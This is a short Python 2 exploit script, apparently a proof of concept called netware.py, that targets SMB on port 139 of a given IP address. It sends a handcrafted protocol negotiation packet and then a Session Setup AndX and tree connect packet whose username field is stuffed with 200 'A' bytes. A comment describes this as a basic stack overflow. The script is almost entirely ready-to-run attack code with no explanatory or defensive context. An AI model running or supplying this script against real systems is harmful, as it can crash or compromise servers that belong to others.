import sys,socket
from socket import *

if len(sys.argv)<=1:     sys.exit('usage: python netware.py IP_ADDR')

host = sys.argv[1],139
payload = "A" * 200

packetnego=(
"\x00\x00\x00\x9a"
"\xff\x53\x4d\x42\x72\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\x15\x00\x00"
"\x01\x3d\x00\x77\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52"
"\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
"\x4d\x49\x43\x52\x4f\x53\x4f\x46\x54\x20\x4e\x45\x54\x29\x4f"
"\x52\x4b\x53\x20\x33\x2e\x30\x00\x02\x44\x4f\x53\x20\x4c\x4d"
"\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x44\x4f\x53\x20\x4c\x41"
"\x4e\x4d\x20\x4e\x32\x2e\x31\x00\x02\x57\x69\x6e\x64\x6f\x77"
"\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
"\x73\x20\x33\x2e\x31\x61\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30"
"\x2e\x31\x32\x00"
)

packetsession=(
"\x00\x00\x01\x3e"
"\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf9\x19\x01\x00\x81\x61"
"\x0d\x75\x00\x7a\x00\x68\x0b\x32\x00\x00\x00\x00\x00\x00\x00\x18"
"\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x3d\x00\x28\xd4\xce"
"\xd7\x93\xc8\x8b\x16\x5f\x42\x2a\x7a\xfd\x15\x7a\xfd\x15\x7a\xfd"+payload+
"\xef\xa5\x42\x5e\x5c\x2d\x4b\x1a\x1c\x59\x4f\x00\x57\x4f\x52\x4b"
"\x47\x52\x4f\x55\x50\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x34\x2e"
"\x30\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x34\x2e\x30\x00\x04\xff"
"\x00\x00\x00\x02\x00\x01\x00\x1f\x00\x00\x5c\x5c\x57\x49\x4e\x2d"
"\x45\x37\x4a\x30\x4f\x4e\x49\x4d\x53\x45\x33\x5c\x55\x53\x45\x52"
"\x53\x00\x3f\x3f\x3f\x3f\x3f\x00"
)

## chained Session Setup Andx, tree connect command, field = username, basic stack overflow.

s = socket(AF_INET, SOCK_STREAM)
s.connect(host)
s.send(''.join(packetnego))
s.send(''.join(packetsession))
print "done !"